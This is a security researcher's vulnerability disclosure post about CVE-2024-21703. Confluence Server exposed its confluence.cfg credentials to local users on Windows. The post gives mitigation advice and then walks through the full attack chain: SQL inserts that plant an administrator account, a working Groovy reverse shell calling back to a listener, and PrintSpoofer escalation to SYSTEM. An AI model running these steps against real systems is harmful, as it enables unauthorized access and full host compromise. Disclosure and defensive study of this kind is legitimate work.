---
layout: post
title:  "CVE-2024-21703 - Confluence Server - Local Privilege Escalation via Misconfigured Config File Permissions"
date:   2024-07-28
---
# Introduction
Client-server based applications commonly store secrets used to access backend components such as databases in configuration files or registry keys.

If these configuration files or registry keys are widely exposed and the server application is running as a privileged user, attack paths can be introduced to escalate privileges with a low privilege host foothold.

# Confluence Server

In 2023, Confluence Server's default installation exposed the `confluence.cfg` file to all members of the local `Users` group. This configuration file contained plaintext database credentials for the applications backend database that anyone with local access to the system could extract and use to authenticate to the backend database.

For vulnerable installations, this configuration introduces an attack path that allows standard Windows users on hosts with Confluence Server installed to gain privileged access to the Confluence instance and in turn, compromise the underlying server and escalate privileges to `NT AUTHORITY\SYSTEM`.

# Advice for Security Teams
1. For Confluence Server instances installed prior to the Atlassian fix, remove the ACE on the `confluence.cfg` file that grants wide system access and replace with a suitable ACE that provides only the Confluence service access.
2. Monitor for connections to the Confluence Server backend database from non-Confluence hosts and processes.
3. Configure the Confluence Server service to run as a dedicated account with least privileges configured - see [https://confluence.atlassian.com/doc/creating-a-dedicated-user-account-on-the-operating-system-to-run-confluence-255362445.html](https://confluence.atlassian.com/doc/creating-a-dedicated-user-account-on-the-operating-system-to-run-confluence-255362445.html).
4. Configure advanced encryption for `confluence.cfg` secrets - see [https://confluence.atlassian.com/doc/advanced-encryption-1115674741.html](https://confluence.atlassian.com/doc/advanced-encryption-1115674741.html).

# Exposed Configuration File
By default, the `confluence.cfg` file is located in `C:\Program Files\Atlassian\Application Data\Confluence`.

![Default permissions configured for confluence.cfg.]({{ '/assets/images/confluence-cfg-perms.png' | relative_url }})

As shown above, the local `Users` group had Access Control Entries (ACEs) configured that allowed read and execute privileges.

As shown below, the contents of this file contained cleartext credentials for the backend DBMS.
![Properties within the file contained cleartext database credentials]({{ '/assets/images/confluence-cfg-contents.png' | relative_url }})

By extracting these credentials from `confluence.cfg`, it was possible to authenticate to the backend DBMS. For Confluence's Postgres configuration, this was done with psql as follows:
```console
C:\Program Files\PostgreSQL\16rc1\bin>psql -U postgres
Password for user postgres:
psql (16rc1)
WARNING: Console code page (437) differs from Windows code page (1252)
         8-bit characters might not work correctly. See psql reference
         page "Notes for Windows users" for details.
Type "help" for help.

postgres=# \c confluence
You are now connected to database "confluence" as user "postgres".
confluence=#
```

# Database Compromise to Privileged Confluence Foothold
Confluence Server stored the following user/group related information in the Confluence database:
- application credentials in the `cwd_user` table.
- group information in the `cwd_group` table.
- group membership information in the `cwd_membership` table.

## Application User Creation
By inserting a row into the `cwd_user` table, it was possible to create a new attacker-controlled Confluence user.

Note: In recent Confluence versions, the [`PKCS5S2`](https://developer.atlassian.com/server/confluence/password-hash-algorithm/) hashing algorithm is used to store the salted password hash. For this proof-of-concept, the salted password hash for `admin` is `{PKCS5S2}yLIYwNvu4mbhTXYF0ZE0CW/IKpG78xrakS1qlm1uuW0I506icmhxmIt+P2v5IDKu`.

The following `INSERT` statement was used to create a new attacker-controlled user `eviladmin`, with the UID of `591523`, and with the password `admin`.

```sql
insert into cwd_user (
   id,
   user_name,
   lower_user_name,
   active,
   created_date,
   updated_date,
   last_name,
   lower_last_name,
   display_name,
   lower_display_name,
   email_address,
   lower_email_address,
   external_id,
   directory_id,
   credential)
values (
   491523,
   'eviladmin',
   'eviladmin',
   'T',
   '2023-09-12 19:46:07.587',
   '2023-09-12 19:46:07.587',
   'eviladmin',
   'eviladmin',
   'eviladmin',
   'eviladmin',
   'eviladmin@evilcorp.com',
   'evil.admin@evilcorp.com',
   '9d9c7244-e4ad-465b-91c5-dfeaad4c39c3'
   ,360449,
   '{PKCS5S2}yLIYwNvu4mbhTXYF0ZE0CW/IKpG78xrakS1qlm1uuW0I506icmhxmIt+P2v5IDKu');
```

## Group Membership Assignment
By inserting rows into the `cwd_membership` table, it was possible to assign high-privileged group membership to the newly created attacker-controlled user.

As shown below, the `confluence-administrators` group and `confluence-users` group had ids `425985` and `425986` respectively (this is likely specific to my test Confluence instance):
```sql
confluence=# select id, group_name from cwd_group;
   id   |        group_name
--------+---------------------------
 425985 | confluence-administrators
 425986 | confluence-users
(2 rows)
```

The following `INSERT` statements were used to add the attacker-controlled user to the `confluence-users` group (id `425986`) and the privileged `confluence-administrators` group (id `425985`):
```sql
confluence=# insert into cwd_membership (id, parent_id, child_user_id) values (589829, 425986, 491523);
INSERT 0 1
confluence=# insert into cwd_membership (id, parent_id, child_user_id) values (589830, 425985, 491523);
INSERT 0 1
confluence=# select * from cwd_membership;
   id   | parent_id | child_group_id | child_user_id
--------+-----------+----------------+---------------
 589825 |    425986 |                |        491521
 589826 |    425985 |                |        491521
 589827 |    425986 |                |        491522
 589828 |    425985 |                |        491522
 589829 |    425986 |                |        491523
 589830 |    425985 |                |        491523
(6 rows)
```

## Necessary User Mapping Row Creation
To allow application access, a row for the user was required in the `user_mapping` table. The purpose of this table was not clear to myself, but adding a row with a `user_key` incremented from the previous records `user_key` was sufficient to grant the ability to login to Confluence.

The following query was used to achieve this:
```sql
insert into user_mapping (user_key, username, lower_username) values ('4028db008a893503018a89379e250002', 'eviladmin', 'eviladmin');
INSERT 0 1
confluence=# select * from user_mapping;
             user_key             | username | lower_username
----------------------------------+----------+----------------
 4028db008a893503018a8935f3940000 | admin    | admin
 4028db008a893503018a89379e250001 | exporter | exporter
 4028db008a893503018a89379e250002 | eviladmin| eviladmin
(3 rows)
```

With the necessary rows added to the database, it was possible to authenticate to Confluence as a Confluence administrator through the login page with the attacker-controlled credentials `eviladmin:admin`.

# Pivoting from Confluence Administrator to OS Shell Access
Administrative Confluence access provides the ability to install, load and execute Confluence plugins, some of which have functionality to execute OS shell commands. For example, the [ScriptRunner for Confluence](https://marketplace.atlassian.com/apps/1215215/scriptrunner-for-confluence?tab=overview&hosting=cloud) plugin allows Groovy script execution through the platform, which can be leveraged to execute processes through the `ProcessBuilder` object. The following example spawns a reverse shell via ScriptRunner:
```groovy
String host="192.168.1.142";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
The following screenshot demonstrates execution through the Confluence web administration interface:
![Reverse shell execution through ScriptRunner plugin]({{ '/assets/images/confluence-groovy-rev-shell.png' | relative_url }})

The executed Groovy reverse shell was caught with netcat:
```console
$ nc -lvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 192.168.1.142.
Ncat: Connection from 192.168.1.142:58735.
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Atlassian\Confluence>
```

# Escalating from Network Service to System
Out-of-the-box, the Confluence Server process runs as `NT AUTHORITY\NETWORK SERVICE`; this security context is assigned the `SeImpersonatePrivilege`, that can be abused to impersonate other accounts such as `NT AUTHORITY\SYSTEM`:

```console
C:\Program Files\Atlassian\Confluence> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

The [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) tool can be used to achieve this through [named pipe impersonation](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/). This can be executed through the Groovy reverse shell as shown below to escalate privileges to `NT AUTHORITY\SYSTEM`, completing the attack chain:

```console
C:\temp>PrintSpoofer64.exe -i -c powershell.exe
PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32>
```

# Conclusion
I hope this post demonstrates how a simple ACE misconfiguration in a widely used product can introduce a vulnerability that can allow both privileged application access and local privilege escalation. Developers and application deployment teams must ensure that configuration files are protected to prevent unnecessary exposure.

# References
- [Local Privilege Escalation via Confluence Server - CrowdStream - Bugcrowd](https://bugcrowd.com/disclosures/a1086522-37fd-4162-89b2-64dec3b05ab2/local-privilege-escalation-via-confluence-server)
- [PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [Atlassian Developer - Password Hash Algorithm](https://developer.atlassian.com/server/confluence/password-hash-algorithm/)
- [ScriptRunner for Confluence](https://marketplace.atlassian.com/apps/1215215/scriptrunner-for-confluence?tab=overview&hosting=cloud)
- [Confluence Support - Creating a Dedicated User Account on the Operating System to Run Confluence](https://confluence.atlassian.com/doc/creating-a-dedicated-user-account-on-the-operating-system-to-run-confluence-255362445.html)
- [Confluence Support - AES Encryption](https://confluence.atlassian.com/doc/advanced-encryption-1115674741.html)